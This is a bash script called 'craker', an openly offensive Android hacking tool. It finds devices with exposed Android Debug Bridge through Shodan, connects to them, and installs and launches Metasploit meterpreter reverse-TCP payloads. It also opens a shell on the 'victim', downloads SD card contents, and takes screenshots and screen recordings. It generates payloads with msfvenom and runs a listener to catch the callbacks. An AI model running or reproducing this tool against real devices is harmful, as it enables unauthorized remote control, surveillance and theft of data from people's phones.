#!/bin/bash
trap ctrl_c INT
ctrl_c(){
echo -en "\e[0mDo you want to get out of craker ? \e[2my/n\e[0m "
read e
if [[ $e == "y" ]]
then
echo -e "\e[31mExiting..\e[0m"
sleep 1
exit
elif [[ $e == "n" ]]
then
craker
else
ctrl_c
fi
}

craker(){
if [[ $1 == "--help" ]]
then
echo -e "./craker --adb \e[2mAdb hacking tool\e[0m"
echo -e "./craker --msfpay \e[2mCreated payload apk\e[0m"
echo -e "./craker --uppay \e[2mUp to payloads\e[0m"
elif [[ $1 == "--adb" ]]
then
echo -e "adb: --find \e[2mFind vulnerable ip\e[0m"
echo -e "adb: --upload <paylaod> \e[2mUpload payload\e[0m"
echo -e "adb: --shell \e[2mConnect to the victim's terminal\e[0m"
echo -e "adb: --download <sdcard> <directory> \e[2mDownload sdcard\e[0m"
echo -e "adb: --connect <ip> \e[2mConnect devices\e[0m"
echo -e "adb: --disconnect \e[2mDisconnect devices\e[0m"
echo -e "adb: --view \e[2mView connected devices\e[0m"
echo -e "adb: --screen <filename> \e[2mScreencap devices\e[0m"
echo -e "adb: --model \e[2mView model devices\e[0m"
echo -e "adb: --record <minutes> <filename> \e[2mScreenrecord devices\e[0m"
echo -e "adb: --packages \e[2mView installed packages\e[0m"
elif [[ $2 == "--find" ]]
then
echo -e "Looking for vulnerable ip \e[2m[*]\e[0m"
echo -en "\e[2m"
curl -s "https://www.shodan.io/search?query=Android+Debug+Bridge" -o androids.txt
cat androids.txt | grep "host" | awk '{print $3}' >> dumps.txt
cat dumps.txt | grep "host" | tr '""<>/=' " " | awk '{print $3}'
rm *.txt
echo -en "\e[0m"
elif [[ $2 == "--upload" ]]
then
echo -e "Uploading and installing $apk \e[2m[*]\e[0m"
echo -en "\e[2m"
adb install -r $3.apk
adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1
echo -en "\e[0m"
elif [[ $2 == "--shell" ]]
then
echo -e "Connect to victim terminal \e[2m[*]\e[0m"
adb shell
elif [[ $2 == "--download" ]]
then
echo -e "Download sdcard victim \e[2m[*]\e[0m"
echo -en "\e[2m"
mkdir $4 
adb pull -p -a $3 $4
echo -en "\e[0m"
elif [[ $2 == "--connect" ]]
then
echo -e "Connect device $3 \e[2m[*]\e[0m"
echo -en "\e[2m"
adb connect $3:5555
echo -en "\e[0m"
elif [[ $2 == "--disconnect" ]]
then
echo -e "Disconnect devices \e[2m[*]\e[0m"
echo -en "\e[2m"
adb disconnect
echo -en "\e[0m"
elif [[ $2 == "--view" ]]
then
echo -en "View devices \e[2m[*]\e[0m\e[2m"
adb devices | grep "device" | awk '{print $1}' | tr 'List' ' '
echo -en "\e[0m"
elif [[ $2 == "--screen" ]]
then
echo -e "Screencap devices \e[2m[*]\e[0m"
echo -en "\e[2m"
adb shell screencap /sdcard/$3.png
adb pull -p -a /sdcard/$3.png ../craker
adb shell rm /sdcard/*.png
echo -en "\e[0m"
elif [[ $2 == "--model" ]]
then
echo -e "Model devices \e[2m[*]\e[0m"
echo -en "\e[2m"
adb devices -l | grep "model" | awk '{print $4}'
echo -en "\e[0m"
elif [[ $2 == "--record" ]]
then
echo -e "Screenrecord devices \e[2m[*]\e[0m"
echo -en "\e[2mRecording $3 minutes [\e[0m\e[32m*\e[0m\e[2m] "
adb shell screenrecord --time-limit $3 /sdcard/$4.mp4
adb pull -p -a /sdcard/$4.mp4 ../craker
adb shell rm /sdcard/*.mp4
echo -en "\e[0m"
elif [[ $2 == "--packages" ]]
then
echo -e "View packages \e[2m[*]\e[0m"
echo -e "\e[2m"
adb shell pm list packages
echo -e "\e[0m"
elif [[ $1 == "--msfpay" ]]
then
echo -e "msfpay: --crp <name> <host> <port> \e[2mCreated payload\e[0m"
echo -e "msfpay: --cop <name> <host> <port> \e[2mConnect payload\e[0m"
elif [[ $2 == "--crp" ]]
then
echo -e "Created payload \e[2m[*]\e[0m"
echo -en "\e[2m"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$4 LPORT=$5 R > $3.apk
echo -en "\e[0m"
elif [[ $2 == "--cop" ]]
then 
echo -e "Connect payload \e[2m[*]\e[0m"
echo "use multi/handler
set payload android/meterpreter/reverse_tcp
set lhost $4
set lport $5 
run " > $3.rc
msfconsole -r $3.rc 
elif [[ $1 == "--uppay" ]]
then
echo -e "uppay: --backup <file> \e[2mFile to up \e[0m"
elif [[ $2 == "--backup" ]]
then
echo -e "File to up $3 \e[2m[*]\e[0m"
echo -en "\e[2m"
python -m webbrowser -n http://localhost:8080/$3
php -S localhost:8000 | grep 'http'
echo -en "\e[0m"
else
echo -e "use: ./craker --help"
fi
}

craker $1 $2 $3 $4 $5 

